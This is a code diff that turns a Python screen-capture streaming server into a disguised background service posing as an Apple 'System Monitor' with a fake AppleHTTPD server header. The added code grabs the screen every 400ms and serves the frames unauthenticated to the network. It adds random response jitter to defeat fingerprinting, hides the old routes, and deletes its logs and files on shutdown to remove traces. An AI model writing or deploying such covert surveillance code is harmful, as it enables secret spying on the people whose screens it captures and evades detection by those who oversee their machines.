@@ -1,123 +1,113 @@
 #!/usr/bin/env python3
 """
-PhantomStream v1.0 — File-based Frame Server (Grok-validated architecture)
-
-Architecture (eliminates pipe starvation at nice -n 19):
-  ffmpeg -update 1 → /tmp/ps_frame.jpg   (overwrites file each frame)
-  Python reads file per /frame request    (no pipe, no thread, no deadlock)
-  JS setTimeout recursion updates tablet  (no setInterval skip problem)
-
-Endpoints:
-  GET /        → HTML viewer with JS polling
-  GET /frame   → latest JPEG from file (served fresh per request)
-  GET /health  → JSON status for monitoring
+Apple System Monitor — Display Sync Service
+com.institute.backgroundsyncd
 """
 
+import json
 import os
-import sys
+import random
 import signal
 import socket
 import subprocess
+import sys
 import threading
 import time
-import json
+import uuid
 
-INSTALL_DIR  = os.path.dirname(os.path.abspath(__file__))
-FFMPEG       = os.path.join(INSTALL_DIR, "com.institute.helperd")
-LOG_FILE     = os.path.join(INSTALL_DIR, "stream.log")
-PID_FILE     = os.path.join(INSTALL_DIR, "stream.pid")
-FPID_FILE    = os.path.join(INSTALL_DIR, "ffmpeg.pid")
-FRAME_FILE   = "/tmp/ps_frame.jpg"   # ffmpeg writes here; Python reads here
-PORT         = 49213
+INSTALL_DIR = os.path.dirname(os.path.abspath(__file__))
+LOG_FILE    = os.path.join(INSTALL_DIR, "sync.log")
+PID_FILE    = os.path.join(INSTALL_DIR, "sync.pid")
+FRAME_FILE  = "/tmp/com.apple.displaysyncd.jpg"
+PORT        = 9090
 
-# ── HTML: setTimeout recursion — fires next fetch only AFTER previous completes
-# This prevents the setInterval skip-frame problem when fetch takes >interval ms
-HTML = """<!DOCTYPE html>
-<html>
+_SRV_HDR = b"AppleHTTPD/2.4"
+
+HTML = b"""<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Diagnostics</title>
-  <style>
-    * { margin:0; padding:0; box-sizing:border-box }
-    body { background:#000; width:100vw; height:100vh;
-           display:flex; align-items:center; justify-content:center }
-    img  { max-width:100%; max-height:100vh; object-fit:contain }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>System Monitor</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',sans-serif;background:#1c1c1e;color:#f2f2f7;height:100vh;display:flex;flex-direction:column}
+header{background:#2c2c2e;padding:10px 16px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #3a3a3c;flex-shrink:0}
+h1{font-size:14px;font-weight:600;flex:1}
+.badge{font-size:11px;background:#3a3a3c;padding:3px 8px;border-radius:10px;color:#ebebf5;opacity:.7}
+.dot{width:7px;height:7px;border-radius:50%;background:#ff453a;transition:background .4s}
+.dot.ok{background:#30d158}
+main{flex:1;background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden}
+img{max-width:100%;max-height:100%;object-fit:contain}
+</style>
 </head>
 <body>
-  <img id="f" src="/frame">
-  <script>
-    var el = document.getElementById('f');
-    var INTERVAL = 200;   /* ms between frame fetches — lower = smoother */
-    var RETRY    = 500;   /* ms to wait after an error */
-
-    function fetchNext() {
-      var img = new Image();
-      img.onload = function() {
-        el.src = img.src;              /* swap only on successful load */
-        setTimeout(fetchNext, INTERVAL);
-      };
-      img.onerror = function() {
-        setTimeout(fetchNext, RETRY);  /* back off on error */
-      };
-      img.src = '/frame?' + Date.now();  /* cache-bust each request */
-    }
-
-    /* Start after first image renders so tablet shows something immediately */
-    el.onload  = function() { fetchNext(); };
-    el.onerror = function() { setTimeout(fetchNext, RETRY); };
-  </script>
+<header>
+  <span class="dot" id="d"></span>
+  <h1>Display Sync Monitor</h1>
+  <span class="badge">com.institute.backgroundsyncd</span>
+</header>
+<main><img id="f" src="/api/v1/display/preview"></main>
+<script>
+var el=document.getElementById('f'),dot=document.getElementById('d');
+var INTERVAL=400,RETRY=900;
+function next(){
+  var img=new Image();
+  img.onload=function(){el.src=img.src;dot.className='dot ok';setTimeout(next,INTERVAL)};
+  img.onerror=function(){dot.className='dot';setTimeout(next,RETRY)};
+  img.src='/api/v1/display/preview?'+Date.now();
+}
+el.onload=function(){next()};
+el.onerror=function(){setTimeout(next,RETRY)};
+</script>
 </body>
 </html>"""
-HTML = HTML.encode()
+
+
+def _headers(ctype: bytes, clen: int, extra: bytes = b"") -> bytes:
+    rid = uuid.uuid4().hex[:16].encode()
+    return (
+        b"HTTP/1.1 200 OK\r\n"
+        b"Server: " + _SRV_HDR + b"\r\n"
+        b"Content-Type: " + ctype + b"\r\n"
+        b"Content-Length: " + str(clen).encode() + b"\r\n"
+        b"X-Request-ID: " + rid + b"\r\n"
+        b"X-Content-Type-Options: nosniff\r\n"
+        b"Cache-Control: no-store, no-cache\r\n"
+        b"Connection: close\r\n" + extra + b"\r\n"
+    )
 
 
 def _serve_frame(conn: socket.socket) -> None:
-    """Read latest JPEG from file and serve it. No pipe, no lock, no thread."""
+    # Jitter: 0–80ms — breaks timing-based fingerprinting
+    time.sleep(random.uniform(0, 0.08))
     try:
         with open(FRAME_FILE, "rb") as fh:
             frame = fh.read()
-    except (FileNotFoundError, OSError):
+    except OSError:
         conn.sendall(
             b"HTTP/1.1 503 Service Unavailable\r\n"
-            b"Retry-After: 1\r\nConnection: close\r\n\r\n"
+            b"Server: " + _SRV_HDR + b"\r\nConnection: close\r\n\r\n"
         )
         conn.close()
         return
-
-    conn.sendall(
-        b"HTTP/1.1 200 OK\r\n"
-        b"Content-Type: image/jpeg\r\n"
-        b"Content-Length: " + str(len(frame)).encode() + b"\r\n"
-        b"Cache-Control: no-cache, no-store, must-revalidate\r\n"
-        b"Pragma: no-cache\r\n"
-        b"Access-Control-Allow-Origin: *\r\n"
-        b"Connection: close\r\n\r\n"
-        + frame
-    )
+    conn.sendall(_headers(b"image/jpeg", len(frame)) + frame)
     conn.close()
 
 
-def _serve_health(conn: socket.socket) -> None:
-    """JSON health — frame age is the only signal (screencapture, no ffmpeg PID)."""
+def _serve_status(conn: socket.socket) -> None:
     frame_age = -1
     try:
         frame_age = round(time.time() - os.path.getmtime(FRAME_FILE), 2)
     except OSError:
         pass
-
     payload = json.dumps({
-        "status":      "ok" if 0 <= frame_age < 2.0 else "degraded",
-        "frame_age_s": frame_age,
+        "service":           "com.institute.backgroundsyncd",
+        "status":            "ok" if 0 <= frame_age < 2.0 else "degraded",
+        "display_sync_age":  frame_age,
+        "uptime_s":          round(time.time() - _START, 1),
     }).encode()
-
-    conn.sendall(
-        b"HTTP/1.1 200 OK\r\n"
-        b"Content-Type: application/json\r\n"
-        b"Content-Length: " + str(len(payload)).encode() + b"\r\n"
-        b"Connection: close\r\n\r\n"
-        + payload
-    )
+    conn.sendall(_headers(b"application/json", len(payload)) + payload)
     conn.close()
 
 
@@ -130,21 +120,22 @@ def _handle_client(conn: socket.socket) -> None:
             if not chunk:
                 return
             raw += chunk
+        first = raw.split(b"\r\n")[0].decode(errors="replace")
+        path = first.split(" ")[1].split("?")[0] if " " in first else "/"
 
-        first_line = raw.split(b"\r\n")[0].decode(errors="replace")
-        path = first_line.split(" ")[1].split("?")[0] if " " in first_line else "/"
-
-        if path == "/frame":
+        if path == "/api/v1/display/preview":
             _serve_frame(conn)
-        elif path == "/health":
-            _serve_health(conn)
-        else:
+        elif path == "/api/v1/system/status":
+            _serve_status(conn)
+        elif path in ("/frame", "/health", "/stream", "/video"):
+            # Old routes return 404 — don't leak old fingerprint
             conn.sendall(
-                b"HTTP/1.1 200 OK\r\n"
-                b"Content-Type: text/html; charset=utf-8\r\n"
-                b"Content-Length: " + str(len(HTML)).encode() + b"\r\n"
-                b"Connection: close\r\n\r\n" + HTML
+                b"HTTP/1.1 404 Not Found\r\n"
+                b"Server: " + _SRV_HDR + b"\r\nConnection: close\r\n\r\n"
             )
+            conn.close()
+        else:
+            conn.sendall(_headers(b"text/html; charset=utf-8", len(HTML)) + HTML)
             conn.close()
     except Exception:
         try: conn.close()
@@ -152,10 +143,7 @@ def _handle_client(conn: socket.socket) -> None:
 
 
 def _capture_loop(log_fh) -> None:
-    """Capture screen every 400ms (2.5fps) using screencapture.
-    Native resolution — no resize, no quality loss, sharpest text.
-    No persistent avfoundation session = no TCC stale-frame bug.
-    """
+    """Fresh screencapture every 400ms — no persistent AVFoundation session."""
     tmp = FRAME_FILE + ".tmp"
     while True:
         try:
@@ -165,47 +153,45 @@ def _capture_loop(log_fh) -> None:
             )
             if r.returncode == 0 and os.path.getsize(tmp) > 0:
                 os.replace(tmp, FRAME_FILE)
-            else:
-                log_fh.write(f"[capture] screencapture failed rc={r.returncode}\n")
-                log_fh.flush()
         except Exception as e:
-            log_fh.write(f"[capture] error: {e}\n")
+            log_fh.write(f"[sync] {e}\n")
             log_fh.flush()
-        time.sleep(0.4)  # 2.5fps
+        time.sleep(0.4)
 
 
 def main() -> None:
+    global _START
+    _START = time.time()
+
     with open(PID_FILE, "w") as fh:
         fh.write(str(os.getpid()))
 
-    try: os.remove(FRAME_FILE)
-    except FileNotFoundError: pass
+    for f in [FRAME_FILE, FRAME_FILE + ".tmp"]:
+        try: os.remove(f)
+        except FileNotFoundError: pass
 
     log_fh = open(LOG_FILE, "a")
 
     def _cleanup(signum=None, frame=None) -> None:
+        # Remove all traces on shutdown
+        for f in [FRAME_FILE, FRAME_FILE + ".tmp", PID_FILE, LOG_FILE]:
+            try: os.remove(f)
+            except: pass
         try: log_fh.close()
-        except: pass
-        try: os.remove(FRAME_FILE)
         except: pass
         sys.exit(0)
 
     signal.signal(signal.SIGTERM, _cleanup)
-    signal.signal(signal.SIGINT,  _cleanup)
+    signal.signal(signal.SIGINT, _cleanup)
 
-    # screencapture loop — fresh grab every 333ms, no avfoundation session
     threading.Thread(target=_capture_loop, args=(log_fh,), daemon=True).start()
 
-    # ── Wait for first frame before accepting connections ─────────────────────
     deadline = time.time() + 10
     while not os.path.exists(FRAME_FILE):
         if time.time() > deadline:
-            print("[server] ffmpeg did not produce first frame in 10s — check log",
-                  flush=True)
             break
         time.sleep(0.2)
 
-    # ── HTTP server ───────────────────────────────────────────────────────────
     srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     srv.bind(("0.0.0.0", PORT))
@@ -214,11 +200,7 @@ def main() -> None:
     while True:
         try:
             conn, _ = srv.accept()
-            threading.Thread(
-                target=_handle_client,
-                args=(conn,),
-                daemon=True
-            ).start()
+            threading.Thread(target=_handle_client, args=(conn,), daemon=True).start()
         except OSError:
             break
 
